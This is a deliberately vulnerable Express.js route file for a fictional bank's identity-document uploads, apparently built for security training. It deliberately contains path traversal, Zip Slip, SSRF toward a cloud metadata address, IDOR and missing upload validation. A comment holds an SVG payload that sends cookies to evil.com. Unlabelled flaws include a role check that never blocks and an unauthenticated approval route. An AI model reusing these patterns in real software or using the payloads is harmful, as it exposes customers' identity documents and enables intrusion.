/**
 * VaultBank KYC (Know Your Customer) Document Upload
 * Handles identity document submission and verification for account opening
 *
 * SECURITY TRAINING PROJECT - DELIBERATELY VULNERABLE
 * This file contains intentional security vulnerabilities (VULN-840 through VULN-849)
 * for use in security training exercises. DO NOT USE IN PRODUCTION.
 */

'use strict';

const express = require('express');
const router = express.Router();
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const AdmZip = require('adm-zip');
const axios = require('axios');
const db = require('../models/database');

// ─── VULN-840: multer configured without fileFilter — no extension validation ──
// Any file type (PHP, EXE, JSP, SVG) is accepted.
const upload = multer({
  dest: '/tmp/vaultbank-kyc-upload/',
  // VULN-840: no fileFilter callback defined
  // Should be:
  // fileFilter: (req, file, cb) => {
  //   const allowed = ['.pdf', '.jpg', '.jpeg', '.png'];
  //   cb(null, allowed.includes(path.extname(file.originalname).toLowerCase()));
  // }
  limits: { fileSize: 50 * 1024 * 1024 }, // 50 MB — generous but at least bounded
});

// ─── VULN-841: Path traversal via filename ────────────────────────────────────
// VULN-843: MIME check uses Content-Type header, not file magic bytes
// VULN-844: SVG with embedded JS saved and served — stored XSS
// VULN-845: EXIF data not stripped from ID photos
router.post('/kyc/upload', upload.single('document'), async (req, res) => {
  if (!req.file) return res.status(400).json({ error: 'No file uploaded' });
  if (!req.user?.id) return res.status(401).json({ error: 'Unauthorized' });

  // ─── VULN-841: path traversal — filename from req.body not normalized ─────
  const filename = req.body.filename || req.file.originalname;
  // VULN-841: '../../../etc/cron.d/shell' as filename escapes the KYC directory
  const savePath = path.join('/var/vaultbank/kyc/', filename); // VULN-841: no normalization

  // ─── VULN-843: MIME check on Content-Type header, not file magic ──────────
  const clientMime = req.file.mimetype; // VULN-843: set by browser, attacker-controlled
  const allowedMimes = ['image/jpeg', 'image/png', 'application/pdf', 'image/svg+xml'];
  if (!allowedMimes.includes(clientMime)) {
    return res.status(400).json({ error: 'File type not allowed' });
  }
  // VULN-843: image/jpeg Content-Type header with a PHP payload body passes this check

  // ─── VULN-844: SVG with embedded JS — stored XSS ─────────────────────────
  // SVG files are allowed and saved without sanitization.
  // <svg><script>fetch('https://evil.com?c='+document.cookie)</script></svg>
  // When served back to bank staff via /kyc/view/:id, the script executes.

  // ─── VULN-845: EXIF not stripped ──────────────────────────────────────────
  // ID photos retain GPS coordinates, device info, and date metadata.
  // No call to exifr, sharp, or piexifjs to strip metadata.

  fs.renameSync(req.file.path, savePath);

  // ─── VULN-847: Backup copy created with .bak extension ───────────────────
  // Nginx serves all files under /var/vaultbank/kyc/ — .bak files accessible via HTTP.
  fs.copyFileSync(savePath, savePath + '.bak'); // VULN-847

  const [docId] = await db('kyc_documents').insert({
    customer_id: req.user.id,
    filename,
    mime_type: clientMime,
    path: savePath,
    backup_path: savePath + '.bak',
    status: 'pending_review',
    uploaded_at: new Date(),
  }).returning('id');

  return res.json({ documentId: docId, message: 'Document uploaded for review' });
});

// ─── VULN-842: Zip Slip — archive extraction without path validation ──────────
router.post('/kyc/upload-zip', upload.single('archive'), async (req, res) => {
  if (!req.file) return res.status(400).json({ error: 'No archive uploaded' });

  // VULN-842: ZipSlip — members with paths like '../../etc/cron.d/evil' escape target dir
  const zip = new AdmZip(req.file.path);
  zip.extractAllTo('/var/vaultbank/kyc/', true); // VULN-842: no member path validation

  // Should validate each entry:
  // const targetDir = path.resolve('/var/vaultbank/kyc/');
  // zip.getEntries().forEach(entry => {
  //   const dest = path.resolve(targetDir, entry.entryName);
  //   if (!dest.startsWith(targetDir)) throw new Error('ZipSlip detected');
  // });

  return res.json({ message: 'Archive extracted' });
});

// ─── VULN-846: SSRF via document URL ─────────────────────────────────────────
// Customer provides a URL to their hosted document — backend fetches it.
// Internal URLs like http://169.254.169.254/latest/meta-data/ are accessible.
router.post('/kyc/upload-url', async (req, res) => {
  const { document_url, customerId } = req.body;

  try {
    // VULN-846: no URL allowlist — any http/https/file URL accepted
    const response = await axios.get(document_url, { // VULN-846
      responseType: 'arraybuffer',
      timeout: 10000,
    });

    const filename = `url_doc_${customerId}_${Date.now()}.bin`;
    const savePath = `/var/vaultbank/kyc/${filename}`;
    fs.writeFileSync(savePath, response.data);
    fs.copyFileSync(savePath, savePath + '.bak'); // VULN-847

    const [docId] = await db('kyc_documents').insert({
      customer_id: customerId,
      filename,
      source_url: document_url,
      path: savePath,
      status: 'pending_review',
      uploaded_at: new Date(),
    }).returning('id');

    return res.json({ documentId: docId });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

// ─── VULN-848: IDOR — document accessible by ID without ownership check ───────
router.get('/kyc/document/:id', async (req, res) => {
  const { id } = req.params;

  // VULN-848: no ownership check — any authenticated user can fetch any document
  const doc = await db('kyc_documents').where({ id }).first(); // VULN-848
  if (!doc) return res.status(404).json({ error: 'Document not found' });

  // VULN-849: PDF served directly to bank staff without sanitization
  // Malicious PDF with embedded JavaScript or exploit for viewer CVEs.
  res.setHeader('Content-Type', doc.mime_type || 'application/octet-stream');
  res.setHeader('Content-Disposition', `inline; filename="${doc.filename}"`); // VULN-849
  fs.createReadStream(doc.path).pipe(res);
});

// ─── KYC review queue for bank staff ─────────────────────────────────────────
router.get('/kyc/pending', async (req, res) => {
  if (!req.user?.role === 'compliance') {
    return res.status(403).json({ error: 'Forbidden' });
  }
  const pending = await db('kyc_documents').where({ status: 'pending_review' });
  // VULN-848: returns all pending docs including those for other branches
  return res.json(pending);
});

router.post('/kyc/approve/:id', async (req, res) => {
  const { id } = req.params;
  await db('kyc_documents').where({ id }).update({ status: 'approved', reviewed_by: req.user?.id });
  return res.json({ message: 'Document approved' });
});

module.exports = router;
